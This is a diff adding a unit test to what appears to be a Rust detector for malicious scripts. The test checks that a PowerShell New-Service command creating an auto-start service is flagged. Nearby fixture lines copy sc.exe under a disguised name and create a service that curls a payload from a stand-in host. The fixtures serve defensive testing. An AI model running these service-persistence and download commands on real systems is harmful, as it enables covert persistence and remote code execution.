@@ -42589,6 +42589,23 @@ mod service_install_tests {
     }
 
     #[test]
+    fn powershell_new_service_emits_service_install_trait() {
+        let script = br#"powershell -Command "New-Service -Name UpdateSvc -BinaryPathName 'cmd.exe /c calc.exe' -StartupType Automatic"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc" && bin_path == "cmd.exe /c calc.exe"
+            )),
+            "PowerShell New-Service install trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_sc_alias_create_binpath_cmd_child_is_analyzed() {
         let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\svc.tmp
 C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.exe https://copied-sc-binpath.example/payload.exe""#;
